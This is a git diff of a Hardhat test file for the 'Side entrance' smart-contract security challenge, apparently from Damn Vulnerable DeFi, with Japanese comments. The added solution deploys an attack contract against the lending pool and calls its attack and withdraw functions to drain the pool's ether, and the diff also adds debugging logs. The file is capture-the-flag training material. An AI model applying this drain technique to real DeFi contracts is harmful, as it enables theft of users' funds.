@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat')
 const { expect } = require('chai')
+// https://hardhat.org/hardhat-network-helpers/docs/reference#setbalance(address,-balance)
+// setBalance is a Hardhat Network helper that allows you to set the balance of an account.
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers')
 
 describe('[Challenge] Side entrance', function () {
@@ -31,11 +33,31 @@ describe('[Challenge] Side entrance', function () {
         expect(await ethers.provider.getBalance(player.address)).to.eq(
             PLAYER_INITIAL_ETH_BALANCE
         )
+        console.log(
+            ethers.utils.formatEther(
+                await ethers.provider.getBalance(player.address)
+            ),
+            `ether`
+        ) // 1.0 ether
+        console.log(`before hook ended`)
     })
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         // ここにコードを書く
+        // SideAttackコントラクトをデプロイする
+        sideAttack = await (
+            await ethers.getContractFactory('SideAttack', deployer)
+        )
+            .connect(player)
+            .deploy(pool.address)
+        // attack関数を呼ぶ
+        console.log(await pool.balances(sideAttack.address)) // 1000 ether
+        await sideAttack.connect(player).attack()
+        // すべてのイーサをプールから引き出す
+        console.log(await pool.balances(sideAttack.address)) // 1000 ether
+        // withdraw関数を呼ぶ
+        await sideAttack.connect(player).withdraw()
     })
 
     after(async function () {
